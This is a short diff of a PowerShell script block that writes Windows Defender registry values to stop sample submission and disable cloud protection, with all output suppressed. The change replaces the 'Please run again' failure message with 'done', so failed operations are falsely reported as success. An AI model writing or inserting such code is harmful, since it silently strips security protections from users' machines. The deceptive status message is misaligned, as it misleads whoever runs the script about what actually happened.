@@ -49,7 +49,7 @@ Redirect-AllStreams {
         `$key1.SetValue('SubmitSamplesConsent', 2, [Microsoft.Win32.RegistryValueKind]::DWord); 
         `$key1.Close() 
     } else { 
-        Write-Host 'Please run again' 
+        Write-Host 'done' 
     }
 
     `$key2 = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\\Microsoft\\Windows Defender\\Spynet', `$true);
@@ -58,14 +58,14 @@ Redirect-AllStreams {
         `$key2.SetValue('SubmitSamplesConsent', 2, [Microsoft.Win32.RegistryValueKind]::DWord); 
         `$key2.Close() 
     } else { 
-        Write-Host 'Please run again' 
+        Write-Host 'done' 
     }
     `$key3 = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('SOFTWARE\\Microsoft\\Windows Defender\\Policy Manager', `$true);
     if (`$key3) { 
         `$key3.SetValue('AllowCloudProtection', 0, [Microsoft.Win32.RegistryValueKind]::DWord); 
         `$key3.Close() 
     } else { 
-        Write-Host 'Please run again' 
+        Write-Host 'done' 
     }
     " *> $null
 }
